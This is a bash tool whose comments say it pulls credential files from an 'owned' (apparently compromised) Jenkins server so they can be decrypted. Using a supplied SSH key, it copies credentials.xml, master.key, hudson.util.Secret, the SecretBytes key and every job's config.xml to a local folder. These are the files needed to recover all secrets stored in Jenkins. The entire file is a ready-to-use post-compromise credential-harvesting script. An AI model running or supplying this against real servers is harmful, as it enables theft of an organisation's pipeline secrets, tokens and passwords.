#!/bin/bash
set -e -o pipefail

# --------------------------------------------
# Script to get credentials files from owned jenkins server and be able to decrypt them.
# --------------------------------------------
script_name=$0
all_args="$*"
output_folder='./output/'

get_named_arguments(){
    while [ $# -gt 0 ]; do
        if [[ $1 == "--help" ]]; then
            script_usage
            exit 0

        elif [[ $1 == "--"* ]]; then
            v="${1/--/}"
            export "$v"="$2"
            shift
        fi
        shift
    done
}

create_output_folder(){
    echo "[INFO] Checking if output folder exists..."
    if [[ ! -d $output_folder ]]; then
        echo "[INFO] Creating output folder."
        mkdir 'output'
        echo "[INFO] Output folder created."
    else 
        echo "[INFO] Output folder already exists."
    fi

}

welcome_message(){
    echo "Welcome, this is a script to get credentials files from owned jenkins server to be able to decrypt them."
}

script_usage(){
    echo ""
    echo "Script to get credentials files from owned jenkins server."
    echo ""
    echo "usage: $script_name --pem-file string --user string --ip string "
    echo ""
    echo "  --pem_file string   path to jenkins server pem file"
    echo "                          (example: ~/.ssh/server.pem)"
    echo "  --user string       user to login to ssh server"
    echo "                          (example: my-user)"
    echo "  --ip string         jenkins server ip"
    echo "                          (example: 0.0.0.0)"
    echo ""
}

user_key_to_continue(){
    echo "PRESS ANY KEY TO CONTINUE..."
    read -n 1 -s -r -p ""
}

get_server_files(){
    echo "[INFO] Getting credentials.xml from server..."
    scp -o ConnectTimeout=5 -i $pem_file $user@$ip:/var/lib/jenkins/credentials.xml "$output_folder/." \
    || { echo "[ERROR] Connection timed out, please check your inputs."; exit 1; }
    echo "[INFO] credentials saved!"

    echo "[INFO] Getting master.key from server..."
    scp -o ConnectTimeout=5 -i $pem_file $user@$ip:/var/lib/jenkins/secrets/master.key "$output_folder/." \
    || { echo "[ERROR] Connection timed out, please check your inputs."; exit 1; }
    echo "[INFO] master key saved!"
    
    echo "[INFO] Getting hudson.util.Secret from server..."
    scp -o ConnectTimeout=5 -i $pem_file $user@$ip:/var/lib/jenkins/secrets/hudson.util.Secret "$output_folder/." \
    || { echo "[ERROR] Connection timed out, please check your inputs."; exit 1; }
    echo "[INFO] hudson.util.Secret saved!"

    echo "[INFO] Getting com.cloudbees.plugins.credentials.SecretBytes.KEY from server..."
    scp -o ConnectTimeout=5 -i $pem_file $user@$ip:/var/lib/jenkins/secrets/com.cloudbees.plugins.credentials.SecretBytes.KEY "$output_folder/." \
    || { echo "[ERROR] Connection timed out, please check your inputs."; exit 1; }
    echo "[INFO] com.cloudbees.plugins.credentials.SecretBytes.KEY saved!"
}

get_configs_files(){
    echo "[INFO] Start task to get configs from jenkins jobs."
    echo "[INFO] Getting jobs dirs."
    dir_list=$(ssh -o ConnectTimeout=5 -i $pem_file $user@$ip ls -d /var/lib/jenkins/jobs/*)
    echo "[INFO] Starting to copy config files..."
    for dir in $dir_list; do 
        folder=$(basename $dir)
        if [ ! -d  $output_folder/jobs/$folder ]; then 
            echo "[INFO] Creating $folder..."
            mkdir -p $output_folder/jobs/$folder
        fi

        echo "[INFO] Trying to copy config from $folder"
        scp -o ConnectTimeout=5 -r -i $pem_file $user@$ip:/var/lib/jenkins/jobs/$folder/config.xml $output_folder/jobs/$folder/. \
        || { echo "[INFO] Confing not found, deleting created folder"; rmdir $output_folder/jobs/$folder; }
    done
    echo "[INFO] End config task."
}

validate_inputs(){
    if [[ -z $pem_file ]]; then
        script_usage
        echo $pem_file
        echo "[ERROR] Missing parameter --pem_file"
        exit
    elif [[ -z $user ]]; then
        script_usage
        echo "[ERROR] Missing parameter --user"
        exit
    elif [[ -z $ip ]]; then
        script_usage
        echo "[ERROR] Missing parameter --ip"
        exit
    fi
}

# --------------------------------------------
#  process: begin
# --------------------------------------------

get_named_arguments $all_args
validate_inputs
echo "[INFO] please wait..." && sleep 2
welcome_message
user_key_to_continue
echo "[INFO] please wait..." && sleep 2
create_output_folder
echo "[INFO] please wait..." && sleep 2
get_server_files
echo "[INFO] please wait..." && sleep 2
get_configs_files
echo "[INFO] script completed without errors"
echo "[INFO] bye...."
# --------------------------------------------
#  process: end
# --------------------------------------------